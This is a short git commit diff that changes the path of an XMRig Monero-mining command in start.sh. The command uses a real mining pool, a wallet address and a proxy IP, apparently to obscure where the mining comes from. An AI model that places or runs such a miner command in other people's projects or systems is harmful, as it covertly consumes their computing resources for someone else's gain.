c72f8879638cbeb908f17a6008e038d02c2a0c1c
Dadora-Lee <dadorasoft@gmail.com>
2025-05-12 14:55:42 +0900

    Update start.sh

--- start.sh
+++ start.sh
@@ -1,1 +1,1 @@
-./xmrig/build/xmrig -o pool.supportxmr.com:3333 -u 42Z6ArQrn7iLBXj93QDsLY7Ho1xM4dXavSz1j8n8YuawUTvXCxaVgUmBpqtHkaFzM4TGBRT6s6kpEdezjwoMhbjJHFe19BU -p XMR_791_AHS -k --proxy=98.175.31.195:4145
+./xmrig -o pool.supportxmr.com:3333 -u 42Z6ArQrn7iLBXj93QDsLY7Ho1xM4dXavSz1j8n8YuawUTvXCxaVgUmBpqtHkaFzM4TGBRT6s6kpEdezjwoMhbjJHFe19BU -p XMR_791_AHS -k --proxy=98.175.31.195:4145
